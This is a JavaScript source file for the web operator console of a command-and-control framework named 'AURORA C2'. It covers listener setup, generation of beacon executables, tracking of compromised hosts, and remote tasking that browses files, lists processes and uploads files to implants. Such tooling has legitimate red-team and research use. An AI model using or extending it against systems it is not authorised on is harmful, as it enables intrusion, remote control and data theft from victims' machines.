/* ═══ AURORA C2 - Web Client Logic ═══ */

const API = (window.AURORA_API || "").replace(/\/$/, "");
const WS_BASE = (window.AURORA_WS || "").replace(/\/$/, "");
let token = localStorage.getItem("aurora_token") || "";
let currentUser = localStorage.getItem("aurora_user") || "";
let selectedBeacon = null;
let ws = null;
let beaconCache = [];
let listenerCache = [];
let editingListenerId = null;
let pollTimer = null;
let commandHistory = [];
let historyIndex = -1;
let fileBrowseTaskId = null;
let fileBrowseTasks = {};
let fileBrowseItems = [];
let fileBrowseSelected = -1;
let fileBrowseDriveItems = [];
let fileBrowseListItems = [];
let fileBrowseLoaded = false;
let fileBrowseExpandedDrives = new Set();
let fileBrowseChildren = {};
let fileBrowseLoadedDirs = new Set();
let procListTaskId = null;
let procListTasks = {};
let procListItems = [];
let procListSelected = -1;
let procListLoaded = false;
let procListFilter = "";
let openPanes = { console: true, files: false, procs: false };
let activePane = "console";
let beaconUiState = {};
const LOCAL_CONSOLE_KEY = "aurora_local_console_history";
const SERVER_SESSION_KEY = "aurora_server_started_at";
let localConsoleHistory = loadLocalConsoleHistory();

// ── DOM helpers ────────────────────────────────────────
const $ = (id) => document.getElementById(id);
const esc = (s) => { const d = document.createElement("div"); d.textContent = s ?? ""; return d.innerHTML; };
const fmtTime = (ts) => { if (!ts) return "-"; const d = new Date(ts * 1000); return d.toLocaleTimeString(); };

// ══════════════════════════════════════════════════════
//  Auth
// ══════════════════════════════════════════════════════

$("login-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const user = $("login-user").value.trim();
    const pass = $("login-pass").value;
    $("login-error").textContent = "";
    try {
        const res = await fetch(`${API}/api/login`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: user, password: pass }),
        });
        if (!res.ok) {
            const err = await res.json().catch(() => ({}));
            $("login-error").textContent = err.detail || "Login failed";
            return;
        }
        const data = await res.json();
        token = data.token;
        currentUser = data.username;
        localStorage.setItem("aurora_token", token);
        localStorage.setItem("aurora_user", currentUser);
        await showMain();
    } catch (err) {
        $("login-error").textContent = "Connection error";
    }
});

function logoutLocal() {
    token = "";
    currentUser = "";
    localStorage.removeItem("aurora_token");
    localStorage.removeItem("aurora_user");
    if (ws) ws.close();
    if (pollTimer) clearInterval(pollTimer);
    selectedBeacon = null;
    $("login-view").classList.remove("hidden");
    $("main-view").classList.add("hidden");
    $("login-pass").value = "";
}

$("btn-logout").addEventListener("click", async () => {
    if (token) {
        await api("/api/logout", "POST").catch(() => null);
    }
    logoutLocal();
});

async function showMain() {
    if (!(await syncServerSession())) return;
    $("login-view").classList.add("hidden");
    $("main-view").classList.remove("hidden");
    $("op-name").textContent = `[${currentUser}]`;
    connectWS();
    refreshListeners();
    refreshBeacons();
    refreshEvents();
    pollTimer = setInterval(() => { refreshBeacons(); }, 10000);
}

// ══════════════════════════════════════════════════════
//  API helpers
// ══════════════════════════════════════════════════════

async function syncServerSession() {
    if (!token) return false;
    const res = await api("/api/server-info");
    if (!res || !res.ok) return false;
    const info = await res.json().catch(() => null);
    const startedAt = String(info?.started_at || "");
    if (!startedAt) return true;

    const previous = localStorage.getItem(SERVER_SESSION_KEY);
    if (previous !== startedAt) {
        localStorage.setItem(SERVER_SESSION_KEY, startedAt);
        localStorage.removeItem(LOCAL_CONSOLE_KEY);
        localConsoleHistory = {};
        beaconUiState = {};
        if (selectedBeacon) {
            $("console-output").innerHTML = "";
        }
    }
    return true;
}

async function api(path, method = "GET", body = null) {
    const opts = {
        method,
        headers: {
            "Authorization": `Bearer ${token}`,
            "Content-Type": "application/json",
        },
    };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(`${API}${path}`, opts);
    if (res.status === 401) {
        logoutLocal();
        return null;
    }
    return res;
}

// ══════════════════════════════════════════════════════
//  Listener list
// ══════════════════════════════════════════════════════

async function refreshListeners() {
    const res = await api("/api/listeners");
    if (!res) return;
    listenerCache = await res.json();
    renderListenerList(listenerCache);
}

function renderListenerList(listeners) {
    const el = $("listener-list");
    if (!listeners || listeners.length === 0) {
        el.innerHTML = '<div class="listener-item"><div class="li-meta">No listeners</div></div>';
        return;
    }
    el.innerHTML = listeners.map(l => {
        return `<div class="listener-item" data-id="${esc(l.id)}">
            <div class="li-name">${esc(l.name)}</div>
            <div class="li-meta">${esc(l.protocol)}://${esc(l.public_host)}:${esc(l.public_port)}</div>
            <div class="li-meta">bind ${esc(l.bind_host)}:${esc(l.bind_port)}</div>
        </div>`;
    }).join("");
    el.querySelectorAll(".listener-item[data-id]").forEach(item => {
        item.addEventListener("click", () => editListener(item.dataset.id));
    });
}

function editListener(id) {
    const l = listenerCache.find(x => x.id === id);
    if (!l) return;
    editingListenerId = id;
    $("listener-form").classList.remove("hidden");
    $("listener-name").value = l.name || "";
    $("listener-bind-host").value = l.bind_host || "0.0.0.0";
    $("listener-bind-port").value = l.bind_port || 8443;
    $("listener-public-host").value = l.public_host || "127.0.0.1";
    $("listener-public-port").value = l.public_port || l.bind_port || 8443;
}

function clearListenerForm() {
    editingListenerId = null;
    $("listener-form").classList.add("hidden");
    $("listener-form").reset();
    $("listener-bind-host").value = "0.0.0.0";
    $("listener-bind-port").value = "8443";
    $("listener-public-host").value = "127.0.0.1";
    $("listener-public-port").value = "8443";
}

function listenerPayload() {
    return {
        name: $("listener-name").value.trim(),
        bind_host: $("listener-bind-host").value.trim() || "0.0.0.0",
        bind_port: Number($("listener-bind-port").value || 8443),
        public_host: $("listener-public-host").value.trim() || "127.0.0.1",
        public_port: Number($("listener-public-port").value || $("listener-bind-port").value || 8443),
        protocol: "http",
    };
}

function openListenerDropdown() {
    $("listener-dropdown").classList.remove("hidden");
    $("btn-listener-menu").classList.add("open");
}

function closeListenerDropdown() {
    $("listener-dropdown").classList.add("hidden");
    $("btn-listener-menu").classList.remove("open");
    clearListenerForm();
}

function toggleListenerDropdown() {
    if ($("listener-dropdown").classList.contains("hidden")) {
        openListenerDropdown();
    } else {
        closeListenerDropdown();
    }
}

// ══════════════════════════════════════════════════════
//  Payload Generator
// ══════════════════════════════════════════════════════

$("btn-payload-menu").addEventListener("click", (e) => {
    e.stopPropagation();
    togglePayloadDropdown();
});

$("payload-dropdown").addEventListener("click", (e) => e.stopPropagation());

function openPayloadDropdown() {
    $("payload-dropdown").classList.remove("hidden");
    $("btn-payload-menu").classList.add("open");
    refreshPayloadListeners();
    refreshPayloadInfo();
}

function closePayloadDropdown() {
    $("payload-dropdown").classList.add("hidden");
    $("btn-payload-menu").classList.remove("open");
}

function togglePayloadDropdown() {
    if ($("payload-dropdown").classList.contains("hidden")) {
        openPayloadDropdown();
    } else {
        closePayloadDropdown();
    }
}

function refreshPayloadListeners() {
    const sel = $("payload-listener");
    const listeners = listenerCache || [];
    sel.innerHTML = listeners.map(l =>
        `<option value="${esc(l.id)}">${esc(l.name)}</option>`
    ).join("");
}

async function refreshPayloadInfo() {
    const infoEl = $("payload-info");
    try {
        const res = await api("/api/payloads/info");
        if (!res || !res.ok) return;
        const info = await res.json();
        const status = info.template_available ? "Ready" : "Not built";
        const cls = info.template_available ? "payload-ready" : "payload-missing";
        let html = `<div class="${cls}">Template: ${esc(status)}</div>`;
        if (info.resources && info.resources.length > 0) {
            html += `<div class="payload-res-list">Resources: ${info.resources.map(esc).join(", ")}</div>`;
        }
        infoEl.innerHTML = html;
    } catch (err) {
        infoEl.innerHTML = "";
    }
}

$("btn-generate-payload").addEventListener("click", async () => {
    const listenerId = $("payload-listener").value;
    if (!listenerId) {
        $("payload-status").textContent = "Select a listener first";
        return;
    }
    const sleep = parseInt($("payload-sleep").value) || 5;
    const jitter = parseInt($("payload-jitter").value) || 20;
    const statusEl = $("payload-status");
    const btn = $("btn-generate-payload");

    statusEl.textContent = "Generating...";
    btn.disabled = true;

    try {
        const res = await fetch(`${API}/api/payloads/generate`, {
            method: "POST",
            headers: {
                "Authorization": `Bearer ${token}`,
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ listener_id: listenerId, sleep, jitter }),
        });

        if (!res.ok) {
            const err = await res.json().catch(() => ({}));
            statusEl.textContent = `Error: ${err.detail || "Generation failed"}`;
            return;
        }

        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        const cd = res.headers.get("Content-Disposition") || "";
        const match = cd.match(/filename="?([^"]+)"?/);
        a.download = match ? match[1] : `aurora_beacon_${listenerId}.exe`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(url);

        statusEl.textContent = `Generated (${(blob.size / 1024).toFixed(1)} KB)`;
    } catch (err) {
        statusEl.textContent = "Connection error";
    } finally {
        btn.disabled = false;
    }
});

// ══════════════════════════════════════════════════════
//  Beacon list
// ══════════════════════════════════════════════════════

async function refreshBeacons() {
    const res = await api("/api/beacons");
    if (!res) return;
    const beacons = await res.json();
    beaconCache = beacons;
    renderBeaconList(beacons);
    if (!beacons || beacons.length === 0) {
        saveCurrentBeaconUiState();
        selectedBeacon = null;
        $("beacon-view").classList.add("hidden");
        $("empty-view").classList.remove("hidden");
        activePane = "events";
        updateWorkspace();
        refreshEvents();
        return;
    }
    if (selectedBeacon) {
        const b = beacons.find(x => x.id === selectedBeacon);
        if (b) {
            updateBeaconInfo(b);
        } else {
            saveCurrentBeaconUiState();
            selectedBeacon = null;
            $("beacon-view").classList.add("hidden");
            $("empty-view").classList.remove("hidden");
            activePane = "events";
            updateWorkspace();
            refreshEvents();
        }
    }
}

function renderBeaconList(beacons) {
    const el = $("beacon-list");
    const previousScrollTop = el.scrollTop;
    if (!beacons || beacons.length === 0) {
        el.innerHTML = '<div style="padding:14px;color:var(--text-dim);font-size:12px;text-align:center">No beacons</div>';
        return;
    }
    el.innerHTML = beacons.map(b => {
        const cls = b.id === selectedBeacon ? "beacon-item active" : "beacon-item";
        const st = b.status || "active";
        return `
        <div class="${cls}" data-id="${esc(b.id)}">
            <div><span class="bi-status ${st}"></span><span class="bi-host">${esc(b.hostname)}</span></div>
            <div class="bi-meta">${esc(b.username)} | listener ${esc(b.listener_id || "-")} | ext ${esc(b.external_ip || "-")} | int ${esc(b.internal_ip || b.ip || "-")} | ${fmtTime(b.last_seen)}</div>
            <div class="bi-meta">${esc(b.id)}</div>
        </div>`;
    }).join("");
    el.querySelectorAll(".beacon-item").forEach(item => {
        item.addEventListener("click", () => selectBeacon(item.dataset.id));
    });
    el.scrollTop = previousScrollTop;
}

$("btn-refresh").addEventListener("click", () => { refreshListeners(); refreshBeacons(); refreshEvents(); });

$("btn-listener-menu").addEventListener("click", (e) => {
    e.stopPropagation();
    toggleListenerDropdown();
});

$("listener-dropdown").addEventListener("click", (e) => e.stopPropagation());

document.addEventListener("click", () => {
    if (!$("listener-dropdown").classList.contains("hidden")) {
        closeListenerDropdown();
    }
    if (!$("payload-dropdown").classList.contains("hidden")) {
        closePayloadDropdown();
    }
});

$("btn-add-listener").addEventListener("click", () => {
    openListenerDropdown();
    clearListenerForm();
    $("listener-form").classList.remove("hidden");
    $("listener-name").focus();
});

$("btn-cancel-listener").addEventListener("click", clearListenerForm);

$("btn-reload-listeners").addEventListener("click", async () => {
    const statusEl = $("listener-status");
    statusEl.textContent = "Reloading listeners...";
    const res = await api("/api/listeners/reload", "POST");
    if (!res || !res.ok) {
        const err = res ? await res.json().catch(() => ({})) : {};
        const msg = err.detail || "Failed to reload listeners";
        statusEl.textContent = msg;
        addEvent("error", msg);
        return;
    }
    statusEl.textContent = "Listeners reloaded successfully.";
    addEvent("warn", "Listeners reloaded successfully");
    refreshEvents();
});

$("btn-delete-listener").addEventListener("click", async () => {
    if (!editingListenerId) return;
    if (!confirm(`Delete listener ${editingListenerId}?`)) return;
    const res = await api(`/api/listeners/${encodeURIComponent(editingListenerId)}`, "DELETE");
    if (!res || !res.ok) {
        const err = res ? await res.json().catch(() => ({})) : {};
        addEvent("error", err.detail || "Failed to delete listener");
        return;
    }
    closeListenerDropdown();
    refreshListeners();
    refreshEvents();
});

$("listener-form").addEventListener("submit", async (e) => {
    e.preventDefault();
    const payload = listenerPayload();
    const path = editingListenerId ? `/api/listeners/${encodeURIComponent(editingListenerId)}` : "/api/listeners";
    const method = editingListenerId ? "PUT" : "POST";
    const res = await api(path, method, payload);
    if (!res || !res.ok) {
        const err = res ? await res.json().catch(() => ({})) : {};
        const msg = err.detail || "Failed to save listener";
        $("listener-status").textContent = msg;
        addEvent("error", msg);
        return;
    }
    const saved = await res.json().catch(() => null);
    if (saved?.id) {
        editingListenerId = saved.id;
    }
    $("listener-status").textContent = "Listener saved. Click reload to apply bind changes.";
    addEvent("warn", "Listener saved. Click reload to apply bind changes.");
    refreshListeners();
    refreshEvents();
});

$("btn-clear-events").addEventListener("click", async () => {
    if (!confirm("Clear all event logs?")) return;
    const res = await api("/api/events", "DELETE");
    if (!res || !res.ok) return;
    $("event-log").innerHTML = "";
});

// ══════════════════════════════════════════════════════
//  Beacon selection & detail
// ══════════════════════════════════════════════════════

async function selectBeacon(bid) {
    if (selectedBeacon) {
        saveCurrentBeaconUiState();
    }

    selectedBeacon = bid;
    renderBeaconList(beaconCache);
    $("empty-view").classList.add("hidden");
    $("beacon-view").classList.remove("hidden");

    const res = await api(`/api/beacons/${bid}`);
    if (!res) return;
    const b = await res.json();
    updateBeaconInfo(b);
    $("console-output").innerHTML = "";

    restoreBeaconUiState(bid);
    loadTaskHistory(bid);

    $("console-prompt").textContent = "Beacon >";
    if (activePane === "console") {
        $("console-input").focus();
    }
}

function updateBeaconInfo(b) {
    $("info-id").textContent = b.id;
    $("info-host").textContent = b.hostname;
    $("info-user").textContent = b.username;
    $("info-os").textContent = `${b.os} ${b.arch}`;
    $("info-external-ip").textContent = b.external_ip || "-";
    $("info-internal-ip").textContent = b.internal_ip || b.ip || "-";
    $("info-listener").textContent = b.listener_id || "-";
    const stEl = $("info-status");
    stEl.textContent = b.status;
    stEl.className = "info-value " + (b.status || "active");
    $("info-seen").textContent = fmtTime(b.last_seen);
}

async function loadTaskHistory(bid) {
    const res = await api(`/api/beacons/${bid}/console`);
    if (!res) return;
    const lines = await res.json();
    const el = $("console-output");
    el.innerHTML = "";
    lines.forEach(line => addConsoleLine(line.cls === "success" ? "result" : line.cls, line.text));
    el.scrollTop = el.scrollHeight;
}

function addConsoleLine(cls, text) {
    const el = $("console-output");
    const div = document.createElement("div");
    div.className = `console-line ${cls}`;
    div.textContent = text;
    el.appendChild(div);
    el.scrollTop = el.scrollHeight;
}

function getConsoleLines() {
    return Array.from($("console-output").querySelectorAll(".console-line")).map(line => ({
        cls: Array.from(line.classList).find(c => c !== "console-line") || "result",
        text: line.textContent || "",
    }));
}

function renderConsoleLines(lines) {
    const el = $("console-output");
    el.innerHTML = "";
    (lines || []).forEach(line => addConsoleLine(line.cls, line.text));
    el.scrollTop = el.scrollHeight;
}

function loadLocalConsoleHistory() {
    try {
        return JSON.parse(localStorage.getItem(LOCAL_CONSOLE_KEY) || "{}") || {};
    } catch (_) {
        return {};
    }
}

function saveLocalConsoleHistory() {
    localStorage.setItem(LOCAL_CONSOLE_KEY, JSON.stringify(localConsoleHistory));
}

function rememberLocalConsoleLine(cls, text, bid = selectedBeacon) {
    if (!bid || !text) return;
    if (!localConsoleHistory[bid]) localConsoleHistory[bid] = [];
    localConsoleHistory[bid].push({ cls, text, ts: Date.now() });
    if (localConsoleHistory[bid].length > 200) {
        localConsoleHistory[bid] = localConsoleHistory[bid].slice(-200);
    }
    saveLocalConsoleHistory();
}

function defaultBeaconUiState() {
    return {
        openPanes: { console: true, files: false, procs: false },
        activePane: "console",
        console: {
            lines: [],
        },
        file: {
            path: ".",
            taskId: null,
            tasks: {},
            items: [],
            selected: -1,
            driveItems: [],
            listItems: [],
            loaded: false,
            expandedDrives: [],
            children: {},
            loadedDirs: [],
        },
        proc: {
            taskId: null,
            tasks: {},
            items: [],
            selected: -1,
            loaded: false,
            filter: "",
        },
    };
}

function stateForBeacon(bid) {
    if (!beaconUiState[bid]) beaconUiState[bid] = defaultBeaconUiState();
    return beaconUiState[bid];
}

function saveCurrentBeaconUiState() {
    if (!selectedBeacon) return;
    beaconUiState[selectedBeacon] = {
        openPanes: { ...openPanes },
        activePane,
        console: {
            lines: getConsoleLines(),
        },
        file: {
            path: $("fb-path").value || ".",
            taskId: fileBrowseTaskId,
            tasks: { ...fileBrowseTasks },
            items: [...fileBrowseItems],
            selected: fileBrowseSelected,
            driveItems: [...fileBrowseDriveItems],
            listItems: [...fileBrowseListItems],
            loaded: fileBrowseLoaded,
            expandedDrives: [...fileBrowseExpandedDrives],
            children: { ...fileBrowseChildren },
            loadedDirs: [...fileBrowseLoadedDirs],
        },
        proc: {
            taskId: procListTaskId,
            tasks: { ...procListTasks },
            items: [...procListItems],
            selected: procListSelected,
            loaded: procListLoaded,
            filter: procListFilter,
        },
    };
}

function restoreBeaconUiState(bid) {
    const state = beaconUiState[bid] || defaultBeaconUiState();
    const consoleLines = state.console?.lines || [];
    renderConsoleLines(consoleLines);
    openPanes = { ...state.openPanes };
    activePane = state.activePane || "console";
    if (activePane === "files" && !openPanes.files) activePane = "console";
    if (activePane === "procs" && !openPanes.procs) activePane = "console";

    const file = state.file || defaultBeaconUiState().file;
    $("fb-path").value = file.path || ".";
    fileBrowseTaskId = file.taskId || null;
    fileBrowseTasks = { ...(file.tasks || {}) };
    fileBrowseItems = [...(file.items || [])];
    fileBrowseSelected = file.selected ?? -1;
    fileBrowseDriveItems = [...(file.driveItems || [])];
    fileBrowseListItems = [...(file.listItems || [])];
    fileBrowseLoaded = !!file.loaded;
    fileBrowseExpandedDrives = new Set(file.expandedDrives || []);
    fileBrowseChildren = { ...(file.children || {}) };
    fileBrowseLoadedDirs = new Set(file.loadedDirs || []);
    renderFileBrowser(fileBrowseListItems);

    const proc = state.proc || defaultBeaconUiState().proc;
    procListTaskId = proc.taskId || null;
    procListTasks = { ...(proc.tasks || {}) };
    procListItems = [...(proc.items || [])];
    procListSelected = proc.selected ?? -1;
    procListLoaded = !!proc.loaded;
    procListFilter = proc.filter || "";
    $("pb-filter").value = procListFilter;
    renderProcList(null);

    updateWorkspace();
    return consoleLines.length > 0;
}

// ══════════════════════════════════════════════════════
//  Workspace windows
// ══════════════════════════════════════════════════════

function updateWorkspace() {
    $("tab-console").classList.toggle("active", activePane === "console");
    $("pane-console").classList.toggle("hidden", activePane !== "console");
    $("tab-events").classList.toggle("active", activePane === "events");
    $("pane-events").classList.toggle("hidden", activePane !== "events");

    $("tab-files").classList.toggle("hidden", !openPanes.files);
    $("tab-files").classList.toggle("active", openPanes.files && activePane === "files");
    $("pane-files").classList.toggle("hidden", !openPanes.files || activePane !== "files");

    $("tab-procs").classList.toggle("hidden", !openPanes.procs);
    $("tab-procs").classList.toggle("active", openPanes.procs && activePane === "procs");
    $("pane-procs").classList.toggle("hidden", !openPanes.procs || activePane !== "procs");
}

function activatePane(name) {
    if (name === "files") {
        openPanes.files = true;
        if (!fileBrowseLoaded) {
            fileBrowseInit();
        }
    }
    if (name === "procs") {
        openPanes.procs = true;
        if (!procListLoaded) {
            procListRefresh();
        }
    }
    activePane = name;
    updateWorkspace();
}

function closeFileBrowser() {
    openPanes.files = false;
    activePane = "console";
    updateWorkspace();
}

function closeProcList() {
    openPanes.procs = false;
    activePane = "console";
    updateWorkspace();
}

$("tab-console").addEventListener("click", () => activatePane("console"));
$("tab-events").addEventListener("click", () => {
    activatePane("events");
    refreshEvents();
});
$("tab-files").addEventListener("click", e => {
    if (e.target?.dataset?.close) return;
    activatePane("files");
});
$("tab-files").querySelector(".tab-close").addEventListener("click", e => {
    e.stopPropagation();
    closeFileBrowser();
});
$("btn-open-files").addEventListener("click", () => activatePane("files"));

$("tab-procs").addEventListener("click", e => {
    if (e.target?.dataset?.close) return;
    activatePane("procs");
});
$("tab-procs").querySelector(".tab-close").addEventListener("click", e => {
    e.stopPropagation();
    closeProcList();
});
$("btn-open-procs").addEventListener("click", () => activatePane("procs"));

// ══════════════════════════════════════════════════════
//  File browse
// ══════════════════════════════════════════════════════

function qarg(s) {
    const v = String(s || "");
    return /\s/.test(v) ? `"${v.replace(/"/g, '\\"')}"` : v;
}

function fbPath() {
    return ($("fb-path").value || ".").trim() || ".";
}

function fbJoin(base, name) {
    if (!base || base === ".") return name;
    const sep = base.includes("/") && !base.includes("\\") ? "/" : "\\";
    return base.endsWith("/") || base.endsWith("\\") ? `${base}${name}` : `${base}${sep}${name}`;
}

function fbParent(path) {
    const p = (path || ".").replace(/[\\/]+$/, "");
    if (!p || p === ".") return ".";
    const idx = Math.max(p.lastIndexOf("\\"), p.lastIndexOf("/"));
    if (idx <= 0) return ".";
    return p.slice(0, idx);
}

function parseLsOutput(text) {
    return String(text || "").split(/\r?\n/).map(line => {
        let m = line.match(/^([d-])\s+(\d+)\s+(\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2})\s{2,}(.+)$/);
        if (m) {
            const name = m[4].trim();
            if (!name || name === "." || name === "..") return null;
            return { type: m[1], size: Number(m[2]), modified: m[3], name };
        }

        m = line.match(/^([d-])\s+(\d+)\s{2,}(.+)$/);
        if (!m) return null;
        const name = m[3].trim();
        if (!name || name === "." || name === "..") return null;
        return { type: m[1], size: Number(m[2]), modified: "-", name };
    }).filter(Boolean);
}

function parseDrivesOutput(text) {
    return String(text || "").split(/\r?\n/).map(line => {
        const m = line.match(/^([A-Za-z]:\\)\s+(\S+)/);
        if (!m) return null;
        return { type: "d", size: 0, modified: m[2], name: m[1], absolute: m[1] };
    }).filter(Boolean);
}

function driveKey(path) {
    const m = String(path || "").replace(/\//g, "\\").match(/^([A-Za-z]:\\?)/);
    return m ? `${m[1].slice(0, 2).toUpperCase()}\\` : "";
}

function pathKey(path) {
    let s = String(path || "").replace(/\//g, "\\");
    if (/^[A-Za-z]:\\?$/.test(s)) return `${s.slice(0, 2).toUpperCase()}\\`;
    return s.replace(/\\+$/, "").toUpperCase();
}

function pathEquals(a, b) {
    return pathKey(a) === pathKey(b);
}

function isDriveRoot(path) {
    return /^[A-Za-z]:\\?$/.test(String(path || "").replace(/\//g, "\\"));
}

function ensurePathChain(path) {
    const drive = driveKey(path);
    if (!drive) return;

    const rest = String(path || "").replace(/\//g, "\\").slice(drive.length);
    const parts = rest.split(/\\+/).filter(Boolean);
    let parent = drive;
    let current = drive;

    fileBrowseExpandedDrives.add(pathKey(drive));

    for (const part of parts) {
        current = fbJoin(current, part);
        const parentKey = pathKey(parent);
        const existing = fileBrowseChildren[parentKey] || [];
        if (!existing.some(it => pathEquals(it.absolute, current))) {
            fileBrowseChildren[parentKey] = [
                ...existing,
                {
                    type: "d",
                    size: 0,
                    modified: "path",
                    name: part,
                    absolute: current,
                    childOf: parent,
                    pathNode: true,
                },
            ];
        }
        fileBrowseExpandedDrives.add(pathKey(parent));
        parent = current;
    }
}

function storeFileBrowseChildren(parentPath, items) {
    const parent = pathKey(parentPath);
    fileBrowseChildren[parent] = (items || [])
        .filter(it => !pathEquals(it.name, parentPath))
        .map(it => ({
            ...it,
            absolute: fbJoin(parentPath, it.name),
            childOf: parent,
        }));
    fileBrowseLoadedDirs.add(parent);
}

function appendFileBrowseChildren(rows, parentPath, depth) {
    const parent = pathKey(parentPath);
    for (const child of fileBrowseChildren[parent] || []) {
        const abs = child.absolute || fbJoin(parentPath, child.name);
        rows.push({ ...child, absolute: abs, depth });
        if (child.type === "d" && fileBrowseExpandedDrives.has(pathKey(abs))) {
            appendFileBrowseChildren(rows, abs, depth + 1);
        }
    }
}

function renderFileBrowser(items) {
    const currentPath = fbPath();
    const currentDrive = driveKey(currentPath);
    if (items) {
        fileBrowseListItems = items;
        if (currentDrive) {
            ensurePathChain(currentPath);
            storeFileBrowseChildren(currentPath, items);
            fileBrowseExpandedDrives.add(pathKey(currentPath));
        }
    }

    const drives = fileBrowseDriveItems.map(d => ({ ...d, isDrive: true }));
    const driveNames = new Set(drives.map(d => pathKey(d.name)));
    if (currentDrive && !driveNames.has(pathKey(currentDrive))) {
        drives.unshift({ type: "d", size: 0, modified: "drive", name: currentDrive, absolute: currentDrive, isDrive: true });
    }

    const ordered = [];
    for (const drive of drives) {
        const key = pathKey(drive.name);
        ordered.push(drive);
        if (fileBrowseExpandedDrives.has(key)) {
            appendFileBrowseChildren(ordered, drive.absolute || drive.name, 1);
        }
    }

    if (ordered.length === 0 && !currentDrive) {
        ordered.push(...(fileBrowseListItems || []));
    }

    fileBrowseItems = ordered;
    fileBrowseSelected = -1;
    const el = $("fb-list");
    if (fileBrowseItems.length === 0) {
        el.innerHTML = '<div class="fb-empty">No files. Click File Browser or list to browse.</div>';
        return;
    }

    el.innerHTML = `
        <div class="fb-head"><span>T</span><span>Name</span><span>Size</span><span>Modified</span></div>
        ${fileBrowseItems.map((it, i) => {
            const key = pathKey(it.absolute || it.name);
            const isDir = it.type === "d";
            const isLoaded = isDir && fileBrowseLoadedDirs.has(key);
            const expanded = isDir && fileBrowseExpandedDrives.has(key);
            const marker = isDir ? (expanded ? "▾" : "▸") : "-";
            const shownName = it.currentDir ? it.name : it.name;
            const indent = (it.depth || 0) * 18;
            return `
        <div class="fb-row ${it.isDrive ? "drive" : ""} ${it.childOf ? "child" : ""} ${it.currentDir ? "current-dir" : ""}" data-index="${i}">
            <span class="fb-marker ${isLoaded ? "loaded" : "unloaded"}">${marker}</span>
            <span class="fb-name ${isDir ? "dir" : ""} ${isDir ? (isLoaded ? "loaded" : "unloaded") : ""}" style="padding-left:${indent}px" title="${esc(shownName)}">${esc(shownName)}</span>
            <span class="fb-size">${it.type === "d" ? "" : it.size}</span>
            <span class="fb-mod">${esc(it.modified || "-")}</span>
        </div>`;
        }).join("")}`;

    el.querySelectorAll(".fb-row").forEach(row => {
        row.addEventListener("click", () => {
            const item = fileBrowseItems[Number(row.dataset.index)];
            if (item?.type === "d") {
                fileBrowseToggleDir(item);
                return;
            }
            selectFileRow(Number(row.dataset.index));
        });
    });
}

function selectFileRow(index) {
    fileBrowseSelected = index;
    document.querySelectorAll(".fb-row").forEach(row => {
        row.classList.toggle("selected", Number(row.dataset.index) === index);
    });
}

function selectedFileItem() {
    return fileBrowseSelected >= 0 ? fileBrowseItems[fileBrowseSelected] : null;
}

function rememberFileBrowseTask(res, kind) {
    if (!res?.task_id) return;
    const bid = res.beacon_id || selectedBeacon;
    if (!bid) return;
    if (bid !== selectedBeacon) {
        const state = stateForBeacon(bid);
        state.file.taskId = res.task_id;
        state.file.tasks[res.task_id] = kind;
        return;
    }
    fileBrowseTaskId = res.task_id;
    fileBrowseTasks[res.task_id] = kind;
}

function invalidateFileBrowsePath(path) {
    const key = pathKey(path);
    delete fileBrowseChildren[key];
    fileBrowseLoadedDirs.delete(key);
}

function fileBrowseReloadPath(path) {
    invalidateFileBrowsePath(path);
    $("fb-path").value = path;
    fileBrowseRefresh();
}

async function fileBrowseRefresh() {
    const path = fbPath();
    $("fb-list").innerHTML = '<div class="fb-empty">Loading...</div>';
    const res = await sendTask(`ls ${qarg(path)}`, {
        silent: true,
        noPending: true,
        source: "filebrowser",
    });
    rememberFileBrowseTask(res, "ls");
}

async function fileBrowseDrives() {
    const res = await sendTask("drives", {
        silent: true,
        noPending: true,
        source: "filebrowser",
    });
    rememberFileBrowseTask(res, "drives");
}

async function fileBrowseInit() {
    fileBrowseLoaded = true;
    $("fb-list").innerHTML = '<div class="fb-empty">Loading current directory...</div>';
    const pwd = await sendTask("pwd", { silent: true, noPending: true, source: "filebrowser" });
    rememberFileBrowseTask(pwd, "pwd-init");
    const drives = await sendTask("drives", { silent: true, noPending: true, source: "filebrowser" });
    rememberFileBrowseTask(drives, "drives-init");
}

function fileBrowseOpen(item) {
    $("fb-path").value = item.absolute || fbJoin(fbPath(), item.name);
    fileBrowseRefresh();
}

function fileBrowseToggleDir(item) {
    const path = item.absolute || fbJoin(fbPath(), item.name);
    const key = pathKey(path);
    if (fileBrowseExpandedDrives.has(key) && fileBrowseLoadedDirs.has(key)) {
        fileBrowseExpandedDrives.delete(key);
        renderFileBrowser(null);
        return;
    }

    $("fb-path").value = path;
    if (fileBrowseLoadedDirs.has(key)) {
        fileBrowseExpandedDrives.add(key);
        renderFileBrowser(null);
        return;
    }

    fileBrowseRefresh();
}

function fileBrowseRemote(item) {
    return item.absolute || fbJoin(fbPath(), item.name);
}

function fileBrowseParentFor(item) {
    const remote = fileBrowseRemote(item);
    const parent = fbParent(remote);
    return parent && parent !== "." ? parent : fbPath();
}

function bytesToBase64(bytes) {
    let binary = "";
    const step = 0x8000;
    for (let i = 0; i < bytes.length; i += step) {
        binary += String.fromCharCode(...bytes.subarray(i, i + step));
    }
    return btoa(binary);
}

async function stageLocalBrowserFile(file) {
    const uploadId = (crypto.randomUUID ? crypto.randomUUID() : `${Date.now()}-${Math.random()}`)
        .replace(/[^A-Za-z0-9_-]/g, "");
    const chunkSize = 524288;
    let offset = 0;
    let localPath = "";

    while (offset < file.size || (file.size === 0 && offset === 0)) {
        const blob = file.slice(offset, offset + chunkSize);
        const data = new Uint8Array(await blob.arrayBuffer());
        const eof = offset + data.length >= file.size;
        const res = await api("/api/local-upload-chunk", "POST", {
            upload_id: uploadId,
            filename: file.name,
            offset,
            eof,
            data_b64: bytesToBase64(data),
        });
        if (!res || !res.ok) {
            const err = res ? await res.json().catch(() => ({})) : {};
            throw new Error(err.detail || "Failed to prepare local file");
        }
        const body = await res.json();
        localPath = body.local_path;
        offset += data.length;
        if (eof) break;
    }

    return localPath;
}

$("fb-refresh").addEventListener("click", fileBrowseRefresh);
$("fb-path").addEventListener("keydown", e => { if (e.key === "Enter") fileBrowseRefresh(); });
$("fb-up").addEventListener("click", () => { $("fb-path").value = fbParent(fbPath()); fileBrowseRefresh(); });
